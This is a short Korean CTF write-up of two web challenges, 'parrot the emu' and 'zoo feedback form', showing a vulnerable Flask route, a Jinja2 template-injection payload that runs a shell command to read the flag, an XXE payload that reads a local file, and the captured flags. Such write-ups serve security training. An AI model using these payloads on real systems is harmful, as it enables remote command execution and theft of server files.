## parrot the emu | 100 | SSTI 

It is so nice to hear Parrot the Emu talk back

Author: richighimi

제공파일 : [parrot-the-emu](./parrot-the-emu.zip)

```python
@app.route('/', methods=['GET', 'POST'])
def vulnerable():
    chat_log = []

    if request.method == 'POST':
        user_input = request.form.get('user_input')
        try:
            result = render_template_string(user_input) #SSTI vuln
        except Exception as e:
            result = str(e)

        chat_log.append(('User', user_input))
        chat_log.append(('Emu', result))
    
    return render_template('index.html', chat_log=chat_log)
```

`{{cycler.init.globals.os.popen('cat flag*').read()}}` 를 입력하면 Flag가 출력 된다.

DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}

<br>
<br>

## zoo feedback form | 100 | XXE

The zoo wants your feedback! Simply fill in the form, and send away, we'll handle it from there!

Author: richighimi

제공파일 : [zoo-feedback-form](./zoo-feedback-form.zip)

```python
docker build -t feedback .
docker run -p 8080:3000 feedback
```

<br>

XML 형식으로 패킷을 보낸다. => XXE 가능
```python
<?xml version="1.0" encoding="UTF-8"?>
<root>
      <feedback>123</feedback>
</root>
```

<br>

```python
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///app/flag.txt"> ]>
            <root>
                <feedback>&xxe;</feedback>
            </root>
            
```
위 요청을 보내 Flag를 획득했다.

DUCTF{emU_say$_he!!0_h0!@_ci@0}